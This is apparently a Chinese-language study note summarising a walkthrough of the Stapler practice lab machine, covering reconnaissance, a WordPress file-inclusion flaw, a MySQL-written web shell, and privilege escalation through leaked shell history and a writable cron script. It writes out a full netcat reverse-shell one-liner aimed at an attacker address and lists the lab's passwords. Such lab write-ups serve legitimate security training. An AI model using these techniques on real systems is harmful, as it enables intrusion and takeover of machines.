---
title: Stapler 簡介
date: 2026-06-27
tags:
  - pg-play
  - linux
  - wordpress
  - bash_history
  - cron-job
  - mysql
status: completed
difficulty: easy
---

# Stapler 簡介

本筆記摘要自詳細報告 [[Stapler-Walkthrough]]。以下是該靶機的快速滲透路徑：

## 1. 偵察與列舉 (Reconnaissance)
*   **連接埠掃描**：開放 FTP (21)、SSH (22)、HTTP (80)、SMB (139/445)、MySQL (3306) 與 HTTPS (12380) 等多個埠口。
*   **資安資訊收集**：
    *   **FTP 匿名登入**：登入取得帳號名稱 `harry`，並從 `note` 檔案中取得 `elly`、`john`。
    *   **SMB 訪客登入**：取得 `todo-list.txt`（提及 Initech 公司）與 `wordpress-4.tar.gz` 壓縮檔。
*   **網頁掃描**：透過 HTTPS (12380) 連接，爆破目錄發現 `/blogblog/` 為 WordPress 網站。

## 2. 初始存取 (Initial Access)
*   **方法 A（原路徑 - LFI 與 MySQL 寫入）**：
    *   使用 [[wordpress#🔍 Wpscan 漏洞與使用者列舉|wpscan]] 發現 `advanced-video-embed-...` 外掛存在 [[wordpress#💥 Advanced Video 1.0 本地檔案包含 (CVE-2016-39646)|LFI（本地檔案包含）]] 漏洞。
    *   利用 LFI 讀取 `/blogblog/wp-config.php`，取得 MySQL 密碼 `root:plbkac`。
    *   登入 MySQL 資料庫，使用 [[mysql#💥 INTO OUTFILE 寫入 Web Shell|INTO OUTFILE]] 將 Web Shell 寫入 `/var/www/https/blogblog/wp-content/uploads/shell.php`。
    *   存取 Web Shell 並觸發 NC Reverse Shell 取得 `www-data` 權限並取得 `local.txt`。
*   **方法 B（替代路徑 - WordPress 帳密爆破與外掛上傳）**：
    *   使用 [[wordpress#🔍 Wpscan 漏洞與使用者列舉|wpscan]] 列舉使用者，並搭配 `rockyou.txt` 進行密碼爆破，成功取得管理員 `john` 的憑證。
    *   登入 `/wp-login.php` 後台，透過 [[wordpress#💥 後台 ZIP 外掛上傳提權|Plugins > Add New > Upload Plugin]] 功能上傳 PHP Shell 的 ZIP 檔案（FTP 提示直接留空）。
    *   訪問 `/wp-content/uploads/` 下上傳的外掛檔案，觸發 Reverse Shell 取得 `www-data` Shell。

## 3. 特權提升 (Privilege Escalation)
*   **方法 A（原路徑 - .bash_history 敏感資訊洩漏與 Sudo 提權）**：
    *   由於各使用者目錄權限為 `755`，`www-data` 可讀取其 [[bash_history|.bash_history 歷史指令]]。
    *   從中發現 `peter` 的 SSH 密碼 `JZQuyIN5`。
    *   以 `peter` 登入 SSH 後，執行 `sudo -l` 發現其擁有 `(ALL : ALL) ALL` 權限，直接執行 `sudo su` 提權為 `root` 取得 `proof.txt`。
*   **方法 B（替代路徑 - 可寫 Cron Job 腳本提權）**：
    *   檢查 `/etc/*cron*` 發現 root 每 5 分鐘會自動執行清理指令碼 `/usr/local/sbin/cron-logrotate.sh`。
    *   檢查該檔案權限，發現其對 other 使用者具有寫入權限。
    *   將 Reverse Shell 指令（如 `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI_IP> 4444 >/tmp/f`）寫入該 [[cron-job|.sh 檔案]]。
    *   在本地端開啟監聽，等待定時任務觸發即可獲得 `root` 權限。
